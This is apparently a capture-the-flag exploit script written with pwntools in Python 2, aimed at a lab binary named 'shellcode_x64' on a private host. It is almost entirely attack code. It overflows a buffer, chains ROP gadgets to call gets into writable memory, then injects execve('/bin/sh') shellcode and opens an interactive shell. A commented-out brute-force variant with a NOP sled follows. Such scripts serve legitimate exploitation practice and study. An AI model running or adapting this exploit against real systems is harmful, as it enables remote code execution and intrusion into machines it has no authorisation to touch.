# -*- coding: utf-8 -*-

from pwn import *
from subprocess import check_output


def pidof(name):
    output = check_output(["pidof", name])
    print "[+] pidof %s : %s" % (name, output)
    result = [int(i) for i in output.split(" ")]
    return result


# context.log_level = 0
LOCAL = False

pwnable_filename = "./shellcode_x64"
libc_filename = "/lib/x86_64-linux-gnu/libc.so.6"

pwnable = ELF(pwnable_filename)
# libc = ELF(libc_filename)


def generate_io(local):
    global libc_filename
    if local:
        Io = process(pwnable_filename)
    else:
        Io = remote("192.168.210.11", 11001)
    return Io


appppppr_addr = 0x0000000000400606
mmmc_addr = 0x00000000004005F0

# gets_plt_addr = pwnable.plt['gets']
gets_got_addr = pwnable.got['gets']

wxable_addr = 0x00601000

junk_size = 40
junk = junk_size * "A"

payload = flat([
    junk,
    p64(appppppr_addr),
    'C' * 0x08,
    # Stage 1
    p64(0),  # rbx
    p64(1),  # rbp
    p64(gets_got_addr),  # r12
    p64(0),  # r13 (arg2)
    p64(0),  # r14 (arg1)
    p64(wxable_addr),  # r15 (arg0)
    p64(mmmc_addr),
    'C' * 0x08,
    # Stage 2
    p64(0),  # rbx
    p64(0),  # rbp
    p64(wxable_addr),  # r12
    p64(0),  # r13 (arg2)
    p64(0),  # r14 (arg1)
    p64(0),  # r15 (arg0)
    p64(mmmc_addr),
])

print "[+] Payload: %r" % (payload)
with open("payload", "wb") as f:
    f.write(payload)

Io = generate_io(LOCAL)

# gdb.attach(
#     proc.pidof(Io)[0],
#     gdbscript='b *%s' % (hex(appppppr_addr))
# )

Io.sendline(payload)

time.sleep(1)
shellcode = "\x90" * 0x10 + "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

payload = flat([
    p64(wxable_addr + 8),
    shellcode
])

Io.sendline(payload)

Io.interactive()

# shellcode_addr = 0x0180d233
# shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

# payload = flat([
#     "A" * junk_size,
#     p64(shellcode_addr),
#     "\x90" * 0x10000,
#     shellcode.ljust(junk_size, "\x90"),
# ])


# for i in range(0x10000):
#     Io = generate_io(LOCAL)
#     Io.sendline(payload)
#     Io.sendline('id')
#     try:
#         print Io.read()
#         break
#     except Exception:
#         pass
#     Io.close()
